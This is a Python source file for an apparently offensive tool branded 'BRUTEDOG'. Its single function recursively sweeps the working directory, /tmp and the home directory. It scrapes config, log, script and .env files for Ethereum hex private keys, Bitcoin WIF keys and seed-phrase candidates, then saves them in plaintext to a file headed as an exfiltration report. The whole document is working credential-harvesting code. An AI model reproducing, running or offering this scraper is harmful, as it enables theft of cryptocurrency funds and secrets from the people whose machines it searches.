import os
import re

def harvest_private_keys(root_dir="."):
    """
    Aggressive deep-file scraper: Recursively sweeps local paths, hidden .env files,
    configuration mounts, and text logs for hex keys, WIFs, and BIP39 seed phrases.
    """
    print(f"\n\033[95m[***] ENGAGING DEEP LOCAL CRYPTOGRAPHIC ARTIFACT SCRAPER [***]\033[0m")
    
    harvested_artifacts = []
    
    # Regex patterns for high-value cryptographic assets
    hex_key_pattern = re.compile(r'\b(0x)?[a-fA-F0-9]{64}\b')
    btc_wif_pattern = re.compile(r'\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b')
    sol_b58_pattern = re.compile(r'\b[1-9A-HJ-NP-Za-km-z]{32,44}\b')
    
    # Target search paths (including mobile terminal storage & temp mounts)
    search_paths = [root_dir, "/tmp", os.path.expanduser("~")]
    
    scanned_files = 0
    for path in search_paths:
        if not os.path.exists(path):
            continue
            
        for current_root, _, files in os.walk(path):
            # Avoid infinite system loops
            if "proc" in current_root or "sys" in current_root:
                continue
                
            for file in files:
                # Target config files, logs, scripts, and hidden environment files
                if file.endswith(('.txt', '.env', '.json', '.log', '.py', '.config', '.conf', '.sh')):
                    file_path = os.path.join(current_root, file)
                    scanned_files += 1
                    try:
                        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                            content = f.read()
                            
                            # Search for EVM Hex Private Keys
                            for match in hex_key_pattern.findall(content):
                                key_val = match if isinstance(match, str) else match[0]
                                if not key_val.startswith("0x"):
                                    key_val = "0x" + key_val
                                artifact = {"type": "Hex Private Key (EVM)", "key_content": key_val, "source": file_path}
                                if artifact not in harvested_artifacts:
                                    harvested_artifacts.append(artifact)
                                    print(f" \033[92m[+] FOUND ETH/EVM KEY: {key_val[:10]}... (in {file_path})\033[0m")
                                    
                            # Search for Bitcoin WIF Private Keys
                            for match in btc_wif_pattern.findall(content):
                                artifact = {"type": "Bitcoin WIF Key", "key_content": match, "source": file_path}
                                if artifact not in harvested_artifacts:
                                    harvested_artifacts.append(artifact)
                                    print(f" \033[92m[+] FOUND BITCOIN WIF: {match[:10]}... (in {file_path})\033[0m")

                            # Search for BIP39 Seed Phrases (12-24 word blocks)
                            words = content.split()
                            if len(words) >= 12:
                                for i in range(len(words) - 11):
                                    chunk = " ".join(words[i:i+12])
                                    # Simple heuristic check for text length/composition
                                    if all(len(w) >= 3 for w in words[i:i+12]):
                                        artifact = {"type": "BIP39 Seed Phrase", "key_content": chunk, "source": file_path}
                                        if artifact not in harvested_artifacts:
                                            harvested_artifacts.append(artifact)
                                            print(f" \033[91m[+++] FOUND SEED PHRASE: {chunk[:25]}... (in {file_path})\033[0m")
                                            break
                    except Exception:
                        pass

    print(f" \033[36m[*] Scanned {scanned_files} files. Total harvested cryptographic artifacts: {len(harvested_artifacts)}\033[0m")
    
    # Save plaintext report immediately for mobile inspection
    os.makedirs("reports", exist_ok=True)
    report_path = "reports/harvested_keys.txt"
    with open(report_path, "w") as out:
        out.write("=== BRUTEDOG CRYPTOGRAPHIC ARTIFACT EXFILTRATION REPORT ===\n")
        for art in harvested_artifacts:
            out.write(f"Type: {art['type']}\nSource: {art['source']}\nKey: {art['key_content']}\n--------------------------------------------------\n")
            
    print(f" \033[92m[+] Plaintext report saved to {report_path}\033[0m")
    return harvested_artifacts
